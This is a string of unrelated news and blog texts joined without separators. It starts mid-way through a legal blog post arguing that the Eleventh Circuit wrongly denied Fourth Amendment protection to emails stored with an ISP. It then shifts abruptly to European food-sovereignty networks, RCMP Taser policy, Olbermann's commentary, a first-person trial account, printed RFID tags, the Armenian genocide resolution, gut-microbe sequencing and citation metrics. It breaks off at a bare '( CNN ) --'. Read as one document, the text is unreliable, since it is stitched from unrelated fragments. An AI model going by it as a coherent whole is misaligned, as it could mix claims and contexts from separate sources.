The Supreme Court “ consistently has held that a person has no legitimate expectation of privacy in information he voluntarily turns over to third parties . ”
Smith v. Maryland , 442 U.S. 735 , 743-44 , 99 S.Ct. 2577 , 2582 , 61 L.Ed.2d 220 ( 1979 ) .
“ [ T ]he Fourth Amendment does not prohibit the obtaining of information revealed to a third party and conveyed by him to Government authorities , even if the information is revealed on the assumption that it will be used only for a limited purpose and the confidence placed in the third party will not be betrayed . ”
United States v. Miller , 425 U.S. 435 , 443 , 96 S.Ct. 1619 , 1624 , 48 L.Ed.2d 71 ( 1976 ) .
. . .
A person also loses a reasonable expectation of privacy in emails , at least after the email is sent to and received by a third party .
See Guest v. Leis , 255 F.3d 325 , 333 ( 6th Cir.2001 )
( An individual sending an email loses “ a legitimate expectation of privacy in an e-mail that had already reached its recipient ” ) ; United States v. Lifshitz , 369 F.3d 173 , 190 ( 2d Cir.2004 )
( An individual may not “ enjoy [ ] an expectation of privacy in transmissions over the Internet or e-mail that have already arrived at the recipient ” ) ; see also United States v. Perrine , 518 F.3d 1196 , 1204-05 ( 10th Cir.2008 )
( “ Every federal court to address this issue has held that subscriber information provided to an internet provider is not protected by the Fourth Amendment ’s privacy expectation ” ) ( collecting cases ) .
Rehberg ’s voluntary delivery of emails to third parties constituted a voluntary relinquishment of the right to privacy in that information .
Rehberg does not allege [ the police ] illegally searched his home computer for emails , but alleges [ the police ] subpoenaed the emails directly from the third - party Internet service provider to which Rehberg transmitted the messages .
Lacking a valid expectation of privacy in that email information , Rehberg fails to state a Fourth Amendment violation for the subpoenas for his Internet records .
III .
Why the Eleventh Circuit is Wrong
I think the Eleventh Circuit ’s analysis is wrong .
To see why , let ’s start by considering Rehberg ’s outgoing e-mails , which seem to be the focus of the Eleventh Circuit ’s opinion .
It is true that when information is disclosed to a third party , the Fourth Amendment no longer protects the information disclosed .
That ’s the teaching of Miller and Smith ( and , for what it ’s worth , and I think those teahcings are correct ) .
But when many copies of information are made , you have to treat different copies differently .
As a result , the fact that one copy of the communication has been received does not mean that all copies lose Fourth Amendment protection .
As I explained in 2008 :
Fourth Amendment rights are contextual .
Data , whether in the form of numbers ( like telephone numbers here ) or text ( in the case of a diary ) , does not have a preordained level of Fourth Amendment protection in the abstract .
If you store your diary at home under your bed , you have Fourth Amendment rights in your diary because you have stored in it your home .
If you go into the park and leave your diary out in the open , you lose Fourth Amendment rights in what you have left open because you have left it open .
The Fourth Amendment rights derive from the steps that the government must go through to retrieve the information in context , not the essential nature of the data itself .
This means that you need to look at the government ’s access to that particular copy of data , not just any copy of data .
For a real - world example , imagine you write a letter and photocopy it before you put it in the mail .
You file the copy in your closet and send the original .
During the course of delivery , the original is protected by the Fourth Amendment ; when it arrives , you lose Fourth Amendment protection .
But the fact that you lose Fourth Amendment protection in the original does not mean that the Government can break into your house and read the copy you made .
Conversely , the fact that the recipient of the mail does not have Fourth Amendment rights in the copy does not mean that the government can break into the recipient ’s house to read the original .
For these reasons , the court should have analyzed access to the e-mails stored with the ISP based on whether there was a reasonable expectation of privacy in that remotely stored copy accessed , independently of delivery of another copy .
Given that we ’re only at the 12 ( b ) ( 6 ) stage , and we do n’t yet know all the facts , I do n’t think we have any basis to conclude that Rehberg did not have a reasonable expectation of privacy in the e-mails obtained .
The conceptual error in Rehberg is in treating Fourth Amendment rights in the copy stored at the ISP as if it were the same as the Fourth Amendment rights in the copy that was delivered .
I do n’t think it works that way .
The rules of Fourth Amendment protection are particular to each copy :
The fact that one copy loses protection does not mean that the other copy loses protection .
Indeed , just think about how differently the Fourth Amendment would apply to the postal network and e-mail under the 11th Circuit ’s approach .
In the postal mail setting , the government could never access postal mail without a warrant .
The mail would be protected by the sender ’s rights pre-sending ; both the sender ’s and the recipient ’s rights in the course of delivery ; and by the recipient ’s rights post - delivery .
In contrast , there would be much less Fourth Amendment protection in the e-mail setting .
Because e-mail usually takes only a few seconds to deliver , the government could just go to the ISP of the person sending the e-mail and take all of their outgoing e-mails right off the server .
Real - time wiretapping would be regulated , but the government would have pretty free access to stored contents .
Further , the complaint appears to allege that the government obtained both outgoing e-mails and incoming e-mails .
Even if you believe that the sender ’s reasonable expectation of privacy disappears as soon as a copy of the e-mail is delivered , presumably that delivery would not eliminate the recipient ‘s reasonable expectation of privacy .
Recall how this works in the physical letter context :
The sender ’s rights extinguish when the letter arrives , but the recipient ’s do not .
Even if you accept the Eleventh Circuit ’s argument , it would seem to apply only to e-mail in Rehberg ’s outbox , not the e-mail in his inbox .
IV .
Some Final Thoughts
Three final thoughts .
First , I think it would be a different case , or at least a potentially different case , if the government had obtained the e-mails from the ISPs of people Rehberg had been e-mailing .
It ’s possible to argue that Rehberg does not have any Fourth Amendment rights in the copies stored on the recipient ’s servers :
That issue requires answering a somewhat tricky issue of when e-mail is “ delivered ” for Fourth Amendment purposes , eliminating the sender ’s reasonable expectation of privacy .
( That issue is actually raised by the DOJ amicus brief in City of Ontario v. Quon ; I ’ll be blogging about that soon . )
Second , there ’s a legitimate argument that the Fourth Amendment does not apply at all to contents , delivered or undelivered , based on a pure application of the third - party doctrine .
I do n’t read the Eleventh Circuit as trying to make that argument , but I disagree with that position in this forthcoming article .
Finally , my argument does not mean that Rehberg should have necessarily prevailed on his Fourth Amendment claim .
The Stored Communications
Act expressly allows some contents of communications to be compelled with a subpoena .
See 18 U.S.C. 2703 ( b ) .
Although I think that provision is generally unconstitutional , for reasons cited above , whether that is “ clearly established ” is of course another matter .
Given that the officers have a qualified immunity defense , the officers may be entitled to qualified immunity even if using a subpoena to compel the contents of e-mail violated the Fourth Amendment .
The growing impossibility of a dignified livelihood in the European countryside has provoked a widespread and active social response on the part of Europeans unwilling to sacrifice their society and environment to corporate greed .
Farmers  unions , environmental organizations , consumers  groups , fair trade organizations , and economic solidarity networks , among many others , have begun to work throughout Europe to denounce the impact of the EUs agricultural policies and call for alternatives .
Responses have varied by country according to the character of local organizations , but all are creating and strengthening alliances between the different social sectors that are negatively affected by the agrifood policies of the Common Agricultural Policy ( CAP ) .
Together , they are creating a host of alternative practices and policies for sustainable production , distribution , and consumption .
For example , in France solidarity networks are being forged between producers and consumers through Associations for the Maintenance of Smallholder Agriculture ( AMAPs ) .
Like Community Supported Agriculture ( CSAs ) , the AMAPs establish solidarity contracts between groups of consumers and local agroecological farmers .
The group pays in advance for produce that the farmer provides weekly .
The first AMAP was created in 2001 between a group of consumers in Aubagne and a farm in the Olivades region of Provence .
Today , there are 750 AMAPs serving 30,000 families throughout France .
These experiences in Europe date back to the 1960s , when Germany , Austria and Switzerland began to develop similar initiatives in response to growing agricultural industrialization .
In Geneva , Les Jardins de Cocagne , a cooperative of producers and consumers of organic vegetables , now serves some 400 homes .
In Britain , CSAs or vegetable box schemes began in the 1990s .
At the beginning of 2007 , there were some 600 CSA initiatives , up 53 % from
2006 .
There are an equal number of farmers  markets in the country ( Soil Association 2005 ) .
In Belgium , where these alternatives have appeared more recently , some 200 homes periodically receive fresh fruit and vegetables through the solidarity purchasing groups called GASAP ( Groupes dAchat Solidaires de lAgriculture Paysanne ) .
In Spain , an AMAP - style initiative of agroecological cooperatives called
Bajo el Asfalto Esta la Huerta (  Under the Asphalt lies the Garden ) operates in Madrid and environs .
Ecoconsum Coordination reports more than 70 similar cooperatives in Catalonia .
Similar initiatives have existed In Andalucía since the 1990s .
All these experiences show it is possible to produce , distribute and consume food based on ecological practices and social justice principles , maintaining a direct relationship between farmer and consumer .
Similar initiatives rapidly spreading across Europe in the last few years include farmers  markets , direct distribution , participatory certification models , and urban gardens .
These food networks are joining forces to politically roll back the EUs neoliberal policies .
In France , Minga , a grouping of 800 associations working on fair local and international trade , now coordinates with the Confédération Paysanne ( farmers  union ) , and other consumers , farmer , and agroecological organizations .
In Spain , the Plataforma Rural , a diverse , broad - based coalition that brings together farmers , consumers , environmental groups and NGOs , works to create stronger linkages between the rural and urban , to improve rural life , and to promote local , socially responsible , and ecological agriculture .
The Plataforma Rural carries out unified campaigns against GMOs , large supermarket chains , the CAP and agrofuels , as well as campaigning in favor of food sovereignty , responsible tourism , and quality public services in rural areas .
In Europe , one of the principle reference networks is the Vía Campesina Coordinator which brings together organizations and farmers  unions from Denmark , Switzerland , France , Italy , the Netherlands , Spain , Greece , Malta , and Turkey .
Its objective is to fight the current agriculture policies promoted by the EU within the framework of the CAP , to move toward a diverse , land - based , smallholder agriculture and a more vibrant rural world .
The European Coordinator of La Vía Campesina works with other social movements within the European Social Forum , and with other unified campaigns against the CAP , and GMOs .
One important challenge in Europe is to increase the connections and coordination between the distinct networks that are part of the alternative globalization movement (  Another World is Possible ) and those groups working for food sovereignty .
The International Food Sovereignty Forum , celebrated in Mali in 2007 , in which networks of women , peasants , fishermen , consumers , and pastoralist organizations all participated , is a good example .
Countries including Hungary and Spain are moving in this direction , by holding national forums .
Activists in Europe are beginning to coordinate action strategies in favor of food sovereignty at the local , national , and continental levels .
As these networks bring in new players , they gather strength .
The task is not easy , but food sovereignty movements and anti-globalization movements are steadily building a common front behind a call popularized by La Vía Campesina :  Globalize struggle , globalize hope . 

OTTAWA — The RCMP plans a sweeping overhaul of its Taser policy following recommendations from inquiries prompted by the death of Polish immigrant Robert Dziekanski .
An internal briefing note obtained by The Canadian Press says the Mounties ’ policy centre on use of force recommends four dozen specific changes on stun gun use .
The note prepared for RCMP Commissioner William Elliott states that the force ’s review involved examination of two reports sparked by the death of Dziekanski , recent changes to Taser policy in Alberta and discussions within the national police force .
“ Once the final ( Taser ) policy is approved , there will be an immediate impact on operations and training which will have to reflect the policy changes , ” says the November note , released under the Access to Information Act .
The briefing note states that although there has been preliminary consultation within the force and with partner agencies , “ further consultations will be required in order to finalize the draft policy before being submitted to the commissioner for final approval . ”
Dziekanski , who hoped to join his mother in British Columbia , died in October 2007 after being hit with a Mountie Taser at the Vancouver airport .
A video of the confrontation taken by a fellow air passenger , in which a confused , sweaty Dziekanski is zapped repeatedly , was seen by millions of people — triggering public outrage and a fundamental re-examination of stun gun use .
Over the last eight years , Tasers have become an increasingly common tool in the arsenal of police services .
Law - enforcement agencies say the tools , which can be shot from a distance or used in up - close touch - stun mode , are often a preferable alternative to pepper spray or batons when dealing with violent suspects .
Critics say police are using the powerful devices to make merely unco-operative people comply with orders even when they do n’t pose a threat to officers or bystanders .
Elliott maintains that the Taser is a useful tool for RCMP officers when used properly .
After looking into the Dziekanski case , Paul Kennedy , then - chairman of the Commission for Public Complaints Against the RCMP , said use of the Taser was “ premature and inappropriate . ”
He called on the Mounties to further clarify for their members and the public when a stun gun should be fired .
Former judge Thomas Braidwood , who led a B.C. public inquiry on Taser use , said while the guns can kill or gravely injure people , they can also be a valuable option for officers .
In an initial report , Braidwood said police should use a Taser only when someone is causing harm to another or there ’s a possibility they will imminently do so .
The B.C. government ordered all police in the province to severely restrict stun gun use , but the RCMP said it needed time to review Braidwood ’s report .
The RCMP briefing note to Elliott says a policy “ revision document is being finalized for review by the commissioner that contains 48 specific recommended ( Taser ) policy changes . ”
Sgt. Greg Cox , an RCMP spokesman , said discussions on the new draft policy continue , adding he could not discuss details at this point .
Federal and provincial governments are working on national standards for Taser use , and it ’s not immediately clear how the latest RCMP revisions would tie in to such a cross-country policy .
The last major changes to the RCMP ’s national Taser policy took effect in February of last year .
However , there have been some revisions .
Following a bulletin from Arizona - based manufacturer Taser International , the RCMP last October issued an advisory that officers should try to avoid aiming a Taser at a person ’s chest .
The company denied the bulletin was an admission the weapons could trigger heart problems , only that limiting the target zone would help “ avoid any potential controversy on this topic . ”

The RCMP also began training officers last year on a revised system for dealing with incidents involving suspects .
The step - by - step system guides officers in their dealings with people from the point they arrive on the scene to possible use of force , including physical contact and weapons such as the Taser or a conventional firearm .

Keith Olbermann believes that Republicans are looking to old John Cusack movies for strategy tips .
“ Between John McCain ’s self - contradiction [ on repealing Do n’t ask , do n’t tell ] and Frank Luntz ’ position , ‘ just lie , ’ [ about regulatory reform ] , ” Olbermann said Tuesday on his MSNBC show .
“ The Republicans are slowly revealing their newest policy : say anything . ”
ADVERTISEMENT
In 2006 , John McCain said he would listen to the opinion of military leaders when it came to repealing ‘ Do n’t ask , do n’t tell . ’
“ I listen to people like General Colin Powell , former Chairman of the Joint Chiefs of Staff , and literally every military leader that I know and they testified before Congress that they felt that the ‘ Do n’t ask , do n’t tell ’ policy was the most appropriate way to conduct ourselves in the military , ” McCain told a student during a Hardball college tour .
Yet McCain seemed to contradict that position after Joint Chiefs of Staff Chairman Admiral Mike Mullen told a Senate Committee that repealing the controversial policy was “ the right thing to do . ”
“ I ’m deeply disappointed in your statement , ” McCain told Mullen .
It would be far more appropriate , I say with great respect , to determine whether repealing this law is appropriate and what effects it would have on the readiness and effectiveness of the military before deciding on whether we should repeal the law or not and fortunately it is an act of Congress and it requires the agreement of Congress in order to repeal it .
Olbermann was also outraged by Frank Luntz , a Republican pollster .
Luntz told Republicans to attempt to kill the Democrats ’ plan for financial regulatory reform by framing it as part of the unpopular bank bailouts .
Olbermann said that the strategy amounted to telling Republicans to “ just lie . ”
ADVERTISEMENT
But of all recent statements by conservatives , Olbermann was most infuriated by Rep. Michele Bachmann , “ who has mentally not been on this planet for three years . ”
The Minnesota Republican told a group of constituents that the government would deny care to people criticized the health care system if reform was passed .
He said that in Japan , to wait and get health care is almost impossible .
You get on a list and you wait and you wait and you wait .
But he said this is something people do n’t know : in Japan , people have stopped voicing their opinion on health care .
There are things that are wrong with Japanese health care , but people are afraid of voicing .
‘ Well why is that , ’ I asked .
[ He said ] , ‘ Because they know that would get on a list and they would n’t get health care .
They would n’t get in .
They would n’t get seen .
And so people are afraid .
They ’re afraid to speak back to government .
They ’re afraid to say anything . ’
Is that what we want for our future ?
That takes us to gangster government at that point !
“ So if you criticize American health care , you get on a list in Japan ?
Or if you criticize American health care you get on a list in America ? ” asked Olbermann .
ADVERTISEMENT
“ Or Michelle Bachman believes every random stranger that comes up and tells her a story about Japan , and believes it ’s going to come true here ? ” Olbermann wondered .
Bachmann ended her talk by saying she would fight health care reform “ until her last breath . ”
Olbermann simply agreed with that idea .
“ Okay , ” he said .

He blew the guards ’ testimony out of the water at every turn , highlighted the appropriate contradictions ( e.g. , Beaudry claims he charged in because he saw the handcuffs in Behrendt ’s hand while Behrendt herself said “ I never got to the point of trying to handcuff him ” ; Behrendt on the stand claims she told me to get away from the car while her written report to ICE makes no mention of that ; numerous other inconsistencies between the testimony of the various guards , and between their spoken vs. written claims ) .
The whole ludicrous claim that I “ choked ” Beaudry ended up a complete nonstarter .
Even the “ aggressive ” and “ assaultive ” stance I was accused of adopting , upon cross , turned out to be me just standing there with my hands open at my sides , not making any moves whatsoever .
Doug caught it all , and shone a light on it .
Nor do I have any complaints about the Prosecutor .
She seems like a nice person , and while she tried her best to nail me to the wall she never went over the line ( beyond a certain fondness for hyperbole , which I gather is part of the game ) .
She did her job ; she obviously did it well enough ; and under other circumstances I could see myself having drinks and swapping arguments with the lady .
I have no complaints about the judge , a seventysomething Irish dude with a fondness for St Patrick ’s Day who drives a blood - red ‘ vette .
He was polite , he kept things as light - hearted as could reasonably be expected , and ( most importantly ) he appeared impartial .
I do n’t even have complaints about all of the border guards .
Behrendt started the ball rolling and Beaudry channeled Eric Cartman to a degree I ’d not have thought possible for a live - action character , but I get the sense the others just got caught up in the turbulence .
Finally , I have no complaints about the jury .
The fact that it took them so bloody long to deliberate suggests to me that they took their job seriously .
Based on what little I could tell during the selection process , they seemed like decent folks .
And while I profoundly disagree with their verdict , I can certainly see how they arrived at it , given the constraints of the statute .
The statute itself ?
Now that I have complaints about .
The press has frequently characterized the charge against me as “ assaulting a federal officer ” .
The alleged ( and discredited ) “ choking ” episode has been repeated ad nauseum .
Here at the Sarnia Best Western I do n’t have the actual statute in front of me but it includes a lengthy grab - bag of actions , things like “ assault ” , “ resist ” , “ impede ” , “ threaten ” , “ obstruct ” — hell , “ contradict ” might be in there for all I know .
And under “ obstruct ” is “ failure to comply with a lawful order ” , and it ’s explicitly stated that violence on the part of the perp is not necessary for a conviction .
Basically , everything from asking “ Why ? ” right up to chain - saw attack falls under the same charge .
And it ’s all a felony .
What constitutes “ failure to comply with a lawful command ” is open to interpretation .
The Prosecution cited several moments within the melee which she claimed constituted “ resisting ” , but by her own admission I was n’t charged with any of those things .
I was charged only with resisting Beaudry , the guard I ’d “ choked ” .
My passenger of that day put the lie to that claim in short order , and the Prosecution was n’t able to shake that .
The Defense pointed out that I was n’t charged with anything regarding anyone else , and the Prosecution had to concede that too .
So what it came down to , ultimately , was those moments after I was repeatedly struck in the face by Beaudry ( an event not in dispute , incidentally ) .
After Beaudry had finished whaling on me in the car , and stepped outside , and ordered me out of the vehicle ; after I ’d complied with that , and was standing motionless beside the car , and Beaudry told me to get on the ground — I just stood there , saying “ What is the problem ? ” , just before Beaudry maced me .
And that , said the Prosecutor in her final remarks — that , right there , was failure to comply .
That was enough to convict .
I do not know what the jury said amongst themselves .
But a question they sent out to the court yesterday afternoon —
“ Is failure to comply sufficient for conviction ? ” — strongly suggests that this was the lynchpin event .
( Certainly Defense had demolished every other , and the Prosecution had conceded as much . )
If that is the case , I cannot begrudge the jury their verdict .
Their job is not to rewrite laws , or ignore stupid ones ; their job is to decide whether a given act violates the law as written .
And when you strip away all the other bullshit — the verbal jousting , the conflicting testimony , the inconsistent reports — the law does n’t proscribe noncompliance “ unless you ’re dazed and confused from being hit in the face ” .
It simply proscribes noncompliance , period .
And we all agree that in those few seconds between Beaudry ’s command and the unleashing of his pepper spray , I just stood there asking what the problem was .
Whether that ’s actual noncompliance or simply slow compliance is , I suspect , what the jury had to decide .
That ’s what they did , and while I think they made the wrong decision I ’m obviously not the most impartial attendee at this party .
I still maintain I did nothing wrong ; but as far as I can tell the trial was fair , and I will abide by its outcome .
Now I am going to drive home , and continue writing e-mails to those of you I have n’t thanked yet .
The tone will be somewhat more somber than those I sent out before the trial , but my appreciation for your support is no less heartfelt .
ULA Delta IV
Heavy launch scrubbed again at Cape Canaveral
ULA scrubbed the liftoff of its Delta IV Heavy rocket a fifth time Wednesday after computers automatically aborted the countdown at Cape Canaveral .
Lines at the grocery store might become as obsolete as milkmen , if a new tag that seeks to replace bar codes becomes commonplace .
Researchers from Sunchon National University in Suncheon , South Korea , and Rice University in Houston have built a radio frequency identification tag that can be printed directly onto cereal boxes and potato chip bags .
The tag uses ink laced with carbon nanotubes to print electronics on paper or plastic that could instantly transmit information about a cart full of groceries .
“ You could run your cart by a detector and it tells you instantly what ’s in the cart , ” says James M. Tour of Rice University , whose research group invented the ink .
“ No more lines , you just walk out with your stuff . ”
RFID tags are already used widely in passports , library books and gadgets that let cars fly through tollbooths without cash .
But those tags are made from silicon , which is more expensive than paper and has to be stuck onto the product as a second step .
“ It ’s potentially much cheaper , printing it as part of the package , ” Tour says .
The new tag , reported in the March issue of IEEE Transactions on Electron Devices , costs about three cents to print , compared to about 50 cents for each silicon - based tag .
The team hopes to eventually bring that cost below one cent per tag to make the devices commercially competitive .
It can store one bit of information — essentially a 1 or a 0 — in an area about the size of a business card .
That ’s not much compared to computer chips , but Tour says this tag is just a “ proof of concept . ”
Study coauthor Gyoujin Cho of Sunchon National University , along with a team from the Printed Electronics Research Center of the Paru Corporation in Suncheon , Korea , are working to pack more transistors into a smaller area to ultimately squeeze 96 bits onto a 3 - square - centimeter tag .
That would be enough to give a unique identification code to each item in a supermarket , along with information like how long the item has been on the shelf , Tour says .
The tags were made possible by the creation of semiconducting ink , which contains carbon nanotubes that will hold an electrical charge .
A transistor needs to be completely semiconducting to hold information , Tour says .
If there are any bits of conducting metal — which moves electric charges around easily — mixed in , the information - holding charge will leak out quickly .
The mixture of nanotubes created in Tour ’s lab includes both semiconducting nanotubes and conducting nanotubes .
Separating out the conducting nanotubes is “ a horrid experience , ” Tour says .
“ They ’re very painful to separate . ”
So instead , the team devised a way to coat the conducting nanotubes in a polymer to protect the electric charge and allow the ink to be purely semiconducting .
Once they had the ink , Cho and his colleagues built roll printers to transfer ink to the final material .
The tags are printed in three layers , and one of the remaining hurdles to making the tags store more memory in less space is to improve the alignment of those layers , Cho says .
“ The work is impressive , ” comments Thomas N. Jackson of Penn State University in University Park , who is also developing flexible electronics .
He thinks it will be difficult to compete with silicon , which is well established in the realm of consumer products packaging .
But similar technology could be used to do things silicon can’t do , he says , such as make smart bandages that can sense infections or freshness - sensing food packaging .
And for those who would rather not have their food broadcast radio waves after getting it home , fear not .
Tour says the signals can be blocked by wrapping groceries in aluminum foil .
ATHEISTS have begun an advertising campaign on Melbourne buses , proclaiming '' Atheism - celebrate reason ' ' , the first time they have entered the fray in such a public way .
The signs are on the backs of 24 buses until March 29 , when the number will rise to 40 and the advertisements will be included on the sides as well , according to Atheist Foundation of Australia president David Nicholls .
British atheists , including author Richard Dawkins , began advertising on buses last year , and now Melbourne is getting on board .
Credit : Reuters
'' This is the first time we have advertised in public in such a big way - it's a very significant move forward for atheists , '' Mr Nicholls said .
Everyone seems to be getting on board since British atheists began the trend late in 2008 , irked that Christians seemed to have a monopoly on billboard advertising .
It spread to atheists in Spain , then other parts of Europe and the US .
New Zealand atheists hope to follow suit .
How quickly can a crisis become a catastrophe ?
Apparently , about as fast as a budget crunch becomes a budget crisis .
To those who write definitions goes the power to modify meanings .
To those who write budgets — or analyze them — goes the privilege of defining down or defining up the nature of a fiscal shortfall .
Gov. Brad
Henry started the year wearing rose - colored glasses , admitting the gravity of the budget crisis but offering mitigating ideas such as " revenue enhancements . ”
We have n’t heard much from him since on that topic , but his spokesman says this is because negotiations are carried out away from the public eye , among a small group of players .
State Rep. Ken Miller , chairman of the House Appropriations and Budget Committee , sees a budget hole for fiscal 2011 " in the $ 500 million range . ”
That ’s a crisis .
Oklahoma Policy Institute analyst David Blatt sees a shortfall of $ 850 million .
That ’s a catastrophe .
Henry , Miller and Blatt know the state is running out of options for balancing a budget without meaningful " revenue enhancements . ”
Tax increases are n’t being discussed ( it ’s an election year ) , only adjustments to tax credits .
Blatt has said the effort to minimize cuts to education and public safety is putting severe pressure on other state services .
Mental health is one of them , he said .
The Rainy Day Fund is not sufficiently full to meet this crisis , catastrophe or whatever it is that we ’re in .
The people may ultimately be asked to decide if they think state government needs more revenue .
WASHINGTON ( Reuters ) -
There are no plans at this point for the full U.S. House of Representatives to vote on a resolution branding as genocide the World War One- era massacre of Armenians by Turkish forces , a Democratic leadership aide said on Friday .
Slideshow ( 5 images )
Despite appeals from the Obama administration , the House Foreign Affairs Committee narrowly approved a nonbinding resolution on Thursday labeling the killings as genocide , prompting Turkey to recall its ambassador from Washington .
“ There are no plans to schedule it at this point , ” the aide said of the measure that the administration said could hurt ties with a NATO ally that is important for U.S. interests in Iraq , Iran , Afghanistan and the Middle East .
Advocates of the largely symbolic measure would have to show Democratic leaders they have the votes to pass it before it would be brought to the House floor , another Democratic aide said .
Both aides spoke on condition that they not be named .
The issue puts Obama between Turkey , a secular Muslim democracy that looks toward the West , and Armenian - Americans , an important constituency in states like California and New Jersey , ahead of the November congressional elections .
Turkish leaders reacted with fury after the House committee passed the resolution on a 23 - 22 vote , and Turkish Prime Minister Tayyip Erdogan warned of possible damage to relations with the United States .
But Turkey said on Friday that it would push on with efforts to normalize ties with Armenia despite the vote .
VOTE COUNTING
An Armenian - American leader said supporters would gather next week to do a “ whip count ” of House backers of the resolution that calls on Obama to ensure U.S. policy recognizes the 1915 massacres as genocide .
Ken Hachikian , chairman of the Armenian National Committee of America , said House Speaker Nancy Pelosi ’s staff had indicated some time ago that the resolution would get a floor vote when backers could show it would pass .
The resolution has 137 co-sponsors , which is one measure of support and not close to the majority of 217 that would be needed to pass .
There are 432 House members at the moment .
Muslim Turkey accepts that many Christian Armenians were killed by Ottoman Turks but denies that up to 1.5 million died and that it amounted to genocide -- a term employed by many Western historians and some foreign parliaments .
The resolution urges Obama to use the term “ genocide ” when he delivers his annual message on the Armenian massacres in April , something he avoided doing last year .

Some scientists dream of sending a probe to Mars , others work on ways of exploring the sea bed with robotic submersibles .
Now a team of researchers have boldly gone where no human has gone before – they have decoded all the bacterial genes found in the human gut .
It may not have quite the same cachet as space exploration or marine biology , but the detailed examination of what is living inside each and every one of us is nevertheless likely to have far - reaching implications for human health and wellbeing , and could even be used to predict chronic intestinal illnesses , from ulcers to cancer .
The study decoded the DNA sequence of the many thousands of genes used by the vast number of bacteria which take up permanent residence inside the human intestines .
It found that about 1,000 different species of microbe can live in the healthy human gut and that each person on average has about 160 species living inside them at any one time – and most of these species are common to different people .
Studying gut bacteria has been difficult , because many are unable to be grown outside of their natural habitat , which is why the scientists believe their findings will shed light on a little - understood or discussed aspect of human biology .
It is estimated that a healthy human gut contains about 100 trillion microbial cells , about 10 times as many cells as there are in the human body .
Yet next to nothing is known about what these bacteria do to maintain health and wellbeing , said Jeroen Raes of Vrije University in Brussels , a member of the international team which decoded the gut genome .
" We have no clue as to how the gut works because this is a very complex ecosystem .
We really do n't know how that ecosystem works even though it is crucial for our wellbeing .
We do n't know how food is digested and which species do what , " Dr Raes said .
" We 've basically sequenced all of their genomes at once .
It was a huge effort because it 's basically the biggest sequencing exercise anyone has done so far – it's about 200 times the sequencing effort of the human genome project , " he said .
The scientists took faecal samples from 124 Europeans and analysed the DNA they contained , using powerful " gene machines " that could quickly decipher the order of the genetic " letters " running along the length of each DNA molecule , the unit of inheritance .
They used a technique called metagenomics , which attempts to sequence every scrap of DNA in a scrambled sample without first having to isolate each and every microbial species .
With these sequences it is possible to work backwards to estimate how many microbial species are present , said Jun Wang of BGI - Shenzhen in China , one of the world 's biggest genome research centres .
" From all the genes in the human gut , over 99 per cent of them are bacterial , indicating that the entire cohort harbours between 1,000 and 1,150 prevalent bacterial species and each individual person has at least 160 such species , which are largely shared [ from one person to another ] , " Dr Wang said .
" Our intestine is home to our largest collections of microbes .
Bacterial densities in the colon [ large intestine ] are the highest recorded for any known ecosystem ... the surprise has been the gut microbes correlated so well with human health .
We have to really study the ' other genome ' of ourselves . "
Dr Raes said the study , published in the journal Nature , was a technical tour - de - force because it involved the simultaneous mass screening of so many different kinds of microbes , some of which are new to science and have never before been studied .
" We 've used this novel DNA sequencing technology to build a big map of all of the genes of the bacterial flora in our gut .
We found about a 1,000 species of bacteria and we hardly know who they are and we definitely do n't know what they are doing , " Dr Raes said .
" It was very surprising for us to find that we have so much more in common than we thought we had .
The guts of different individuals have a substantial overlap in terms of species composition and function because it was always thought that human gut flora was very variable . "
The human gut is effectively sterile until birth and in the first year of life the flora fluctuates wildly until it begins to settle down after weaning .
It is clear from research on laboratory animals that a rich mixture of gut bacteria is essential for digestion and some medical authorities believe that gut flora may help to fend off disease .
" This blueprint helps us to see the natural variation in healthy individuals .
But it also has a small clinical component in that we also see that for people with Crohn 's disease or ulcerative colitis we can already separate them based on their gut flora ... we may be able to predict whether someone is susceptible to these diseases , " Dr Raes said .
" This is study is like the first blueprint .
We are gathering all the pieces as it were and we 're trying to piece them all together .
We are not there yet but now we use this information to compare healthy individuals with patients with Crohn 's disease or ulcerative collitis , or with obese people , " he said .
The human gut is just one " ecosystem " being targeted by the technology of metagenomics .
Marine biologists are also sampling seawater in the same way , to see what kind of bacteria and other microbes can be found there .
Like the investigation of gut bacteria , scientists are discovering a vast array of hitherto undiscovered microbes .
" A lot of things we found were new ... whenever you go fishing for microbial diversity you find thousands of novel species because the microbial world is vastly uncharted , " Dr Raes said .
" It 's a technical tour - de - force .
It was not thought we could do metagenomics on this scale ... this is a snapshot for a single moment for each of these individuals , so we know we have an idea about the variation among individuals , but we have no idea about change over time . "
In his regular column , the BBC's Pallab Ghosh looks into how measures of the quality of scientific research have changed .
In the old days it did n't matter so much which journal research was published in .
Now it counts for everything .
Are citations a valuable measure of good research ?
Funding bodies now award grants almost exclusively to researchers who have published in a handful of top scientific journals .
According to Peter Lawrence , an emeritus professor at the University of Cambridge , it 's this new accounting mentality that is " corrupting " the scientific process .
Professor Lawrence , who used to edit a scientific journal , and is a respected researcher himself , says " it 's a bit like judging a hospital by how quickly the telephone is answered .
" [ Awarding grants ] was never a very accurate process in the past .
But it was done by people reading the [ research ] papers and determining whether it contained sparks of originality and quality of rigour and argument .
Now that aim has been more or less abandoned . "
What counts now is how often the research is cited , or mentioned , by other researchers in their publications , he says .
This is supposed to be a reflection of how influential a piece of research has been .
But many outside the grant awarding system regard it as a crude measure .
Citations , they say , measure how fashionable and well funded a field of research is rather than its true quality .
Real value ?
Nowadays , scientists are ranked by working out how many papers they publish in top journals and the degree to which their work is cited .
Some funding bodies even have complex algorithms to calculate a researcher 's prowess .
According to Professor Lawrence : " Once you start doing that , those numbers start gaining an importance to a point where in fact the real value of the work is extinguished . "
The priority now for many career scientists is to market themselves in a way that maximises their ability to have their research published in the top journals .
They spend time travelling to scientific meetings to network with colleagues who may be reviewing their work .
The research itself can at times seem a secondary concern .
Because everything now depends on being published in the top journals they are on the receiving end of an enormous number of submissions .
Some journals send only 10 % of the research papers they receive for review .
Journal editors therefore have to make difficult decisions in a short space of time on which research to consider for publication and which to throw out .
All sorts of factors come to bear on those decisions .
Among these is consideration of the journal 's own " impact factor " - which is determined by how often the research they publish is cited .
International lottery Again , this can favour mediocre research in a fashionable field over high quality work in a smaller , less well funded area .
It can also favour established scientists who are well known in their field .
To younger scientists , publication in a major journal may seem like a lottery .
Of course , the work has to be of high quality , but it also depends on a great deal of good luck , being part of an influential group and on the timing of its submission .
If their work is published , they increase their chances of promotion and receiving further funding .
If not , their career stands still or , once their funding runs out , takes a nosedive .
People have to publish , so they submit more to the top journals , exacerbating the problem for already overstretched journal editors dealing with an avalanche of research papers .
The only way out of this cycle of " corruption " , according to Peter Lawrence , is for grant agencies to move away from counting citations and to actually read research proposals and to judge their quality .

( CNN ) --
